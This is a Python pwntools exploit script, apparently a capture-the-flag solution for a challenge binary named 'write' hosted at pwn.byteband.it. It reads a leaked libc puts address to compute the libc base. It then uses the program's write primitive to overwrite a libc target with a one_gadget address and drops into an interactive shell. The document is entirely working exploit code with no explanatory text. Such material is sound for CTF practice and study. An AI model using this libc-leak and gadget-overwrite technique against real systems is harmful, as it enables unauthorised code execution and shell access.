from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./write"
HOST = "pwn.byteband.it"
PORT = 9000

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

libc = ELF('./libc-2.27.so')
off_puts = libc.symbols["puts"]
off_target = 0x619f60
#libc_binsh = next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c, 0xe569f]

def w(ptr, val):
	conn.sendlineafter("uit\n","w")
	conn.sendlineafter(": ",str(ptr))
	conn.sendlineafter(": ",str(val))

def exploit():
	conn.recvuntil(": ")
	libc_puts = int(conn.recvline(), 16)
	conn.recvuntil(": ")
	rbp_x18 = int(conn.recvline(), 16)
	
	libc_base = libc_puts - off_puts
	print hex(libc_base)
	one_gadget = libc_base + gadget[3]
	libc_target = libc_base + off_target	
	
	w(libc_target, one_gadget)
	conn.sendlineafter("uit\n","q")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
